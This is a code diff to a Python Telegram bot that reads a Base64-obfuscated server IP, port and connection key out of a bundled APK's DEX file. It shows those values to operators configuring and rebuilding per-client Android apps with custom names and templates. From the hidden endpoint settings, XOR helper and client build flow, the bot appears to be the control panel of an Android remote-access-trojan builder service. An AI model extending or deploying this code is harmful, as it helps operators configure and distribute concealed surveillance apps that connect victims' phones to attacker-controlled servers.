@@ -295,6 +295,87 @@ def xor_encrypt(plaintext: str) -> str:
     ).decode("ascii")
 
 
+# ── Companion APK server-config reader ───────────────────────────────────────
+_COMPANION_APK = os.path.join(REPO_DIR, "app", "src", "main", "assets", "companion.apk")
+
+def read_companion_server_config() -> dict:
+    """Read current IP, port, key from companion.apk assets DEX.
+
+    Scans classes.dex for Base64 strings that decode to an IPv4 address,
+    a numeric port, and the key (looked up by known default or by proximity).
+    Returns dict with keys: ip, port, key, ip_b64, port_b64, key_b64.
+    All values are empty string if not found or APK not accessible.
+    """
+    import zipfile, re as _re
+
+    result = {"ip": "", "port": "", "key": "",
+              "ip_b64": "", "port_b64": "", "key_b64": ""}
+    try:
+        if not os.path.isfile(_COMPANION_APK):
+            return result
+        with zipfile.ZipFile(_COMPANION_APK, "r") as z:
+            if "classes.dex" not in z.namelist():
+                return result
+            dex = z.read("classes.dex")
+
+        b64_pat = _re.compile(rb'[A-Za-z0-9+/]{6,}={0,2}')
+
+        found_ip   = ""
+        found_port = ""
+        found_key  = ""
+        found_ip_b64   = ""
+        found_port_b64 = ""
+        found_key_b64  = ""
+
+        for m in b64_pat.finditer(dex):
+            raw = m.group()
+            try:
+                dec = base64.b64decode(raw + b"==").decode("ascii")
+            except Exception:
+                continue
+            # IPv4
+            if not found_ip and _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', dec):
+                found_ip     = dec
+                found_ip_b64 = raw.decode()
+            # Port (numeric 1024–65535)
+            elif not found_port and _re.match(r'^\d{3,5}$', dec) and 1024 <= int(dec) <= 65535:
+                found_port     = dec
+                found_port_b64 = raw.decode()
+
+        # Key: scan for known default OR any short printable non-numeric string
+        # near the IP position in the DEX
+        if found_ip_b64:
+            ip_pos = dex.find(found_ip_b64.encode())
+            search_zone = dex[max(0, ip_pos - 5000): ip_pos + 5000]
+            for m in b64_pat.finditer(search_zone):
+                raw = m.group()
+                try:
+                    dec = base64.b64decode(raw + b"==").decode("ascii")
+                except Exception:
+                    continue
+                if (not found_key
+                        and 3 <= len(dec) <= 32
+                        and dec.isprintable()
+                        and not dec.isdigit()
+                        and not _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', dec)
+                        and not _re.match(r'^[A-Z_]{3,}$', dec)   # skip Android constants
+                        and "/" not in dec and "\\" not in dec):
+                    found_key     = dec
+                    found_key_b64 = raw.decode()
+
+        result.update({
+            "ip":       found_ip,
+            "port":     found_port,
+            "key":      found_key,
+            "ip_b64":   found_ip_b64,
+            "port_b64": found_port_b64,
+            "key_b64":  found_key_b64,
+        })
+    except Exception:
+        pass
+    return result
+
+
 # ── Git binary auto-detection (Layer 2) ──────────────────────────────────────
 _git_exe   = None  # cached git binary path
 _sync_lock = threading.Lock()  # Layer 3: mutex — no concurrent pulls
@@ -1697,35 +1778,60 @@ def text_server_ip_prompt(client_id: int, template: str) -> str:
     db.close()
     name = c["profile_name"] or c["telegram_username"] if c else "Unknown"
     emoji, tpl_name = TEMPLATES.get(template, ("⚙️", template.title()))
+    # Auto-detect current values from companion APK
+    cfg = read_companion_server_config()
+    if cfg["ip"] or cfg["port"] or cfg["key"]:
+        current_line = (
+            "━━━━━━━━━━━━━━━━━━━━\n"
+            "📌 <b>Current in companion:</b>\n"
+            f"   📡 IP   : <code>{cfg['ip']  or '—'}</code>\n"
+            f"   🔌 Port : <code>{cfg['port'] or '—'}</code>\n"
+            f"   🔑 Key  : <code>{cfg['key']  or '—'}</code>\n"
+        )
+    else:
+        current_line = ""
     return (
         f"🌐 <b>Server Config — {name}</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         f"Template: {emoji} {tpl_name}\n"
+        + current_line +
         "━━━━━━━━━━━━━━━━━━━━\n"
-        "📡 Enter server IP:\n\n"
+        "📡 Enter new server IP:\n\n"
         "<i>Example: 192.168.1.100</i>"
     )
 
 
 def text_server_port_prompt(ip: str) -> str:
+    cfg = read_companion_server_config()
+    current_line = (
+        f"<i>Current: <code>{cfg['port'] or '—'}</code></i>\n\n"
+        if cfg["port"] else ""
+    )
     return (
         "🌐 <b>Server Config</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        f"📡 IP   : {ip}\n"
+        f"📡 IP   : <code>{ip}</code>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "🔌 Enter server port:\n\n"
+        + current_line +
         "<i>Example: 7771</i>"
     )
 
 
 def text_server_key_prompt(ip: str, port: str) -> str:
+    cfg = read_companion_server_config()
+    current_line = (
+        f"<i>Current: <code>{cfg['key'] or '—'}</code></i>\n\n"
+        if cfg["key"] else ""
+    )
     return (
         "🌐 <b>Server Config</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        f"📡 IP   : {ip}\n"
-        f"🔌 Port : {port}\n"
+        f"📡 IP   : <code>{ip}</code>\n"
+        f"🔌 Port : <code>{port}</code>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "🔑 Enter connection key:\n\n"
+        + current_line +
         "<i>Example: MySecretKey123</i>"
     )
 
@@ -3184,6 +3290,23 @@ def handle_server_config_key(message):
     buf["key"]  = key
     buf["step"] = "done"
     server_config_buf[chat_id] = buf
+    # Read current companion values for before→after diff
+    _cfg = read_companion_server_config()
+    _old_ip   = _cfg["ip"]   or "—"
+    _old_port = _cfg["port"] or "—"
+    _old_key  = _cfg["key"]  or "—"
+    _new_ip   = buf["ip"]
+    _new_port = buf["port"]
+    _new_key  = buf["key"]
+    def _diff(old, new):
+        return f"<code>{new}</code>" if old == new else f"<s>{old}</s> → <code>{new}</code>"
+    _diff_block = (
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        "🔄 <b>Config Update Preview:</b>\n"
+        f"   📡 IP   : {_diff(_old_ip,   _new_ip)}\n"
+        f"   🔌 Port : {_diff(_old_port, _new_port)}\n"
+        f"   🔑 Key  : {_diff(_old_key,  _new_key)}\n"
+    )
     # Show confirmation screen
     template   = buf["template"]
     client_id  = buf["client_id"]
@@ -3193,26 +3316,28 @@ def handle_server_config_key(message):
         safe_edit(message.chat.id, msg_id,
                   text_custom_build_confirm(
                       client_id, cbuf["app_name"],
-                      srv_ip=buf["ip"], srv_port=buf["port"],
-                      srv_key=buf["key"]),
+                      srv_ip=_new_ip, srv_port=_new_port,
+                      srv_key=_new_key)
+                  + "\n" + _diff_block
+                  + "━━━━━━━━━━━━━━━━━━━━\n"
+                    "Everything correct?",
                   kb_build_confirm(client_id, template))
     elif is_rebuild:
-        # Rebuild flow — show rebuild confirm screen with ✅ Confirm Rebuild button
         safe_edit(message.chat.id, msg_id,
                   f"🔁 <b>Rebuild — confirm config</b>\n"
-                  f"━━━━━━━━━━━━━━━━━━━━\n"
-                  f"📡 Server IP   : <code>{buf['ip']}</code>\n"
-                  f"🔌 Port        : <code>{buf['port']}</code>\n"
-                  f"🔑 Key         : <code>{buf['key']}</code>\n"
-                  f"━━━━━━━━━━━━━━━━━━━━\n"
-                  f"Confirm to rebuild with this config:",
+                  + _diff_block +
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  "Confirm to rebuild with this config:",
                   kb_rebuild_confirm(client_id, template))
     else:
         safe_edit(message.chat.id, msg_id,
                   text_build_confirm(
                       client_id, template,
-                      srv_ip=buf["ip"], srv_port=buf["port"],
-                      srv_key=buf["key"]),
+                      srv_ip=_new_ip, srv_port=_new_port,
+                      srv_key=_new_key)
+                  + "\n" + _diff_block
+                  + "━━━━━━━━━━━━━━━━━━━━\n"
+                    "Everything correct?",
                   kb_build_confirm(client_id, template))
 
 
